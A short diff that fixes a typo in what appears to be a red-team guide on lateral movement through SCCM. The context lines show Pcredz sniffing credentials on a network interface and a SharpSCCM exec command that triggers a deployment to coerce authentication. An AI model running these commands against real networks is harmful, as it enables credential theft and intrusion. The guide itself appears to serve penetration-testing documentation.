@@ -64,7 +64,7 @@ Pcredz -i enp0s8 -t
 SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET
 ```
 
-Note that the incoming authentication requsts might take a while (couple minutes) to roll in...
+Note that the incoming authentication requests might take a while (couple minutes) to roll in...
 
 ![](<../assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment.png>)
 
